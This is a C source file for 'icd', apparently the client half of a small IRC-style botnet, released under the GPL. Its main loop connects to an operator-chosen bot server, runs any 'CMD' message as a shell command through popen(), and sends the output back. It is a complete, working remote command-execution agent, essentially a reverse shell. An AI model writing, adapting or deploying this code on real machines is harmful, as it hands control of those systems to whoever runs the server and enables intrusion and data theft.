/*
 * Copyright (c) 2010 John Gordon <jgor@indiecom.org>
 *   and Doug Farre <dougfarre@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <limits.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include "core.h"
#include "sock.h"

void print_version() {
    printf("icd v%s\n", VERSION);
    exit(EXIT_SUCCESS);
}

void print_help() {
    printf("Usage: icd -[hv] -a ADDRESS -p PORT\n");
    printf("\n");
    printf("Options:\n");
    printf("  -a, --address=ADDRESS  ipv4/6 address of the ircss server\n");
    printf("  -p, --port=PORT        port number on the ircss server\n");
    printf("  -h, --help             display this screen\n");
    printf("  -v, --version          display version\n");
    exit(EXIT_SUCCESS);
}

/* available command line arguments: short/long form and number of args */
static struct option long_options[] = {
    {"port",    1, 0, 'p'},
    {"address", 1, 0, 'a'},
    {"help",    0, 0, 'h'},
    {"version", 0, 0, 'v'},
    {0, 0, 0, 0}
};

void run_icd(char *address, int port) {
    int conn_sockfd, err, status;
    char buf[MAX_BUF], cmd[MAX_BUF], args[MAX_BUF], msg[MAX_BUF];
    FILE *fp;

    /* validate port number */
    if (port < 1 || port > 65535) error("invalid port");

    /* connect to the provided address and port, the bot server */
    conn_sockfd = get_conn_sock(address, port);

    /* listen indefinitely for incoming messages */
    while (1) {
        /* read an incoming message from the bot server */
        memset(&buf, 0, sizeof(buf));
        err = read(conn_sockfd, buf, MAX_BUF);
        if (err == -1) error("read failed");
        /* lost connection with server */
        else if (err == 0) break;

        /* parse the incoming messages as a single command followed by args */
        sscanf(buf, "%s %[^\n]", cmd, args);

        /* CMD, a system command to be executed on the bot's machine */
        if (strcmp(cmd, "CMD") == 0) {
            /* execute the command and open a pipe to the output */
            fp = popen(args, "r");
            if (fp == NULL) error("popen failed");

            /* read in the command's output */
            while (fgets(buf, MAX_BUF, fp) != NULL) {
                /* send each line of output back as a MSG string for the user */
                snprintf(msg, MAX_BUF, "MSG %s", buf);
                err = write(conn_sockfd, msg, strlen(msg)); 
                if (err == -1) error("write failed");
            }

            status = pclose(fp);
            if (status == -1) error("pclose failed");
        }       
    }
}

int main(int argc, char **argv) {
    int next_arg;
    char *port = NULL, *address = NULL;
    extern char *optarg;
    extern int optind;
    
    /* parse all command line arguments */
    while (1) {
        int option_index = 0;

        /* parse the next argument based on specified possible arguments */
        next_arg = getopt_long_only(argc, argv, "p:a:hv", long_options, &option_index); /* done parsing arguments, move on */
        if (next_arg == -1) break;

        switch(next_arg) {
            /* set destination port */
            case 'p': port = optarg; break;
            /* set destination address */
            case 'a': address = optarg; break;
            case 'v': print_version(); break;
            case 'h': default: print_help(); break;
        }
    }

    /* both address and port are required arguments */
    if (address == NULL || port == NULL) print_help();

    run_icd(address, atoi(port));

    return 0;
}

